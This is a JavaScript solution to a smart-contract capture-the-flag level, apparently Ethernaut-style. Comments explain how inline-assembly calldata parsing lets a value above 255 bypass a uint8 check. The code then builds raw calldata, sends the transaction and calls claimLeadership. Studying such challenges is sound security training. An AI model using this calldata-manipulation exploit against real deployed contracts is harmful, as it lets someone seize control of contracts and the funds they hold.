/**
 * This is pretty easy as compared to its difficult level which was 4/5, but it's just a matter of understanding the code and then just changing the offset to get the things done
 * Anyways, let's get straight to the solution and some explanation regarding this challenge.
 * 
 * To claim the leadership, we need to provide `treasury` a value greater than 255, but the `registerTreasury` function won't allow that to happen, as it takes a uint8 value which ranges to 0-255. Thus, we need to find a way to bypass this check.
 * One more thing to notice within that `registerTreasury` function is that it is using inline assembly for it's computation and the `calldata` is being passed to it. Plus, you will notice `calldataload(4)` in the same line which describes that it is loading the 4th byte from the `calldata` and then storing it in the `offset` variable. First 4 bytes are used for the function signature.
 * Hence, what we will do is create a signature for the `registerTreasury` function and then pass the offset value greater than 255 to it, so that we can bypass the check and claim the leadership.  
*/

// This will create a signature for the `registerTreasury` function. Notice we are passing a uint256 value to it by converting 256 into a hex form and adding 64 to the left. That substring(2) is used to remove the `0x` from the hex value as that's been already added by the first part of data.
const data = 
    web3.eth.abi.encodeFunctionSignature('registerTreasury(uint256)') + web3.utils.leftPad(web3.utils.toHex(256), 64).substring(2)

// Now, we will send the transaction to the instance with the data we have created above
await sendTransaction({
    from: player,
    to: instance,
    data: data
})

// Finally, we will claim the leadership
await contract.claimLeadership()